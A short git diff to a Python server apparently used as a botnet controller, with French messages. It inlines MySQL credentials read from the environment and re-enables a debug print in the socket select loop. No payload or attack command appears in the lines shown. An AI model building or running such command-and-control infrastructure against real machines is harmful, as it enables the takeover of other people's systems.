@@ -48,10 +48,6 @@ def reception(queue, conn, addr):
 
 def start_botnet():
     load_dotenv()
-    DB_HOST = os.getenv("DB_HOST")
-    DB_USERNAME = os.getenv("DB_USERNAME")
-    DB_PASS = os.getenv("DB_PASS")
-    DB_NAME = os.getenv("DB_NAME")
 
     print("démarrage du serveur sur le port " + str(4242))
 
@@ -74,10 +70,10 @@ def start_botnet():
 
     # Database
     db = mysql.connector.connect(
-        host=DB_HOST,
-        user=DB_USERNAME,
-        password=DB_PASS,
-        database=DB_NAME
+        host=os.getenv("DB_HOST"),
+        user=os.getenv("DB_USERNAME"),
+        password=os.getenv("DB_PASS"),
+        database=os.getenv("DB_NAME")
     )
 
     mycursor = db.cursor()
@@ -85,7 +81,7 @@ def start_botnet():
     running = True
 
     while running:
-        # print("running")
+        print("running")
         # print(connection_list)
 
         read_sockets, write_sockets, error_sockets = select.select(connection_list, [], connection_list, 3.0)
